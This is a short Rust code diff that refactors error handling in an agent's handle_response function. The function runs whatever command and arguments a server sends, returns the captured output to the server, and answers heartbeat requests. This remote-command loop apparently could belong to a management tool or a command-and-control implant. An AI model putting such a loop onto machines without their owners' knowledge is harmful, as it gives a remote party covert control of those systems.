@@ -6,7 +6,7 @@ use anyhow::Result;
 use std::process::Command;
 use std::process::Output;
 
-pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) {
+pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) -> Result<()> {
     match response.packet_body {
         AgentInstructionBody::Command {
             ref command,
@@ -21,10 +21,7 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
             );
 
             // Execute the received command with arguments
-            let output: Output = Command::new(command)
-                .args(args)
-                .output()
-                .expect("Failed to execute command");
+            let output: Output = Command::new(command).args(args).output()?;
 
             // Capture stdout, stderr, and status code
             let stdout = String::from_utf8_lossy(&output.stdout).to_string();
@@ -47,7 +44,7 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
             };
 
             // Send the response back to the server with the actual command output
-            make_request(agent, agent_response).await;
+            make_request(agent, agent_response).await?;
         }
         AgentInstructionBody::RequestHeartbeat => {
             devlog!("Received heartbeat request from server.");
@@ -58,6 +55,7 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
     }
 
     devlog!("Processed Response: {:#?}", response);
+    Ok(())
 }
 
 /// Sends a heartbeat to the server.
